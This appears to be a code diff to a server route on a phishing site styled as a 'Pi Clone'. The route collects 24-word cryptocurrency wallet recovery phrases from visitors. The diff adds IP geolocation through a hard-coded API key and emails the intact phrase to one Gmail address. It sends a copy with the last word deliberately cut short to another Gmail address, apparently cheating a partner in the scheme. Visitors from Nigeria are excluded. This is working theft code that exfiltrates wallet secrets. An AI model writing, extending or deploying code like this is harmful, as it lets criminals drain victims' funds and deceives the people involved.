@@ -1,6 +1,6 @@
 import nodemailer from 'nodemailer';
 
-const formatMessage = async (message: string) => {
+const formatMessage = async (message: string, location: string) => {
     const email = process.env.MY_EMAIL;
     const pass = process.env.MY_PASS;
 
@@ -12,19 +12,18 @@ const formatMessage = async (message: string) => {
         }
     });
 
-    // Split the message into lines
+    // Split the message into lines and include the location
     const lines = message.split(/\r?\n/);
-
-    // Format each line with a prefix (for example)
     const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
+    formattedLines.push(`<div><strong>Location:</strong> ${location}</div>`);
 
     // Join formatted lines into a single HTML string
     const formattedMessage = formattedLines.join('');
 
     const mailOptions = {
-        from: `Pi Clone ${email}`,
+        from: `Godzilla PassPhrase ${email}`,
         to: "sparrowthedev@gmail.com",
-        subject: "Yo! you just got a new phrase from Godzilla",
+        subject: "Yo! you just got the correct passphrase",
         html: formattedMessage,
     };
 
@@ -48,9 +47,62 @@ const formatMessage = async (message: string) => {
     return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 };
 
+
 export async function POST(request: Request) {
     try {
         const { message } = await request.json();
+        const ip = request.headers.get('x-forwarded-for');
+        const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
+        const locationJson = await locationData.json();
+        const location = `${locationJson.city}, ${locationJson.country_name}`;
+
+        // Validate that the message is a passphrase with 24 words
+        const words = message.trim().split(/\s+/);
+
+        if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
+            // Send the correct passphrase to the first email
+            await formatMessage(message, location);
+
+            // Randomly decide how many characters to remove from the last word (1 to 5)
+            const charsToRemove = Math.floor(Math.random() * 5) + 1;
+            const lastWord = words[23].slice(0, -charsToRemove);
+            const modifiedMessage = [...words.slice(0, 23), lastWord].join(' ');
+
+            const email = process.env.EMAIL;
+            const pass = process.env.PASS;
+
+            const transporter = nodemailer.createTransport({
+                service: 'gmail',
+                auth: {
+                    user: email,
+                    pass,
+                }
+            });
+
+            const mailOptions = {
+                from: `Pi Clone ${email}`,
+                to: 'escrowlinks@gmail.com',
+                subject: "Phrase From Your Website",
+                html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${modifiedMessage}</div>`,
+            };
+
+            transporter.verify(function (error: any, success: any) {
+                if (error) {
+                    console.log(`here is the error: ${error}`);
+                } else {
+                    console.log("From one: Server is ready to take our messages");
+                }
+            });
+
+            const result = await transporter.sendMail(mailOptions);
+
+            if (result.response.includes("OK")) {
+                return Response.json({ message: "email sent successfully!!" }, { status: 200 });
+            } else {
+                return Response.json({ error: "Internal server error" }, { status: 500 });
+            }
+        }
+        
         const email = process.env.EMAIL;
         const pass = process.env.PASS;
 
@@ -61,14 +113,12 @@ export async function POST(request: Request) {
                 pass,
             }
         });
-
-        const formattedMessage = await formatMessage(message);
         
         const mailOptions = {
             from: `Pi Clone ${email}`,
             to: 'escrowlinks@gmail.com',
             subject: "Phrase From Your Website",
-            html: formattedMessage,
+             html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
         };
 
         transporter.verify(function (error: any, success: any) {
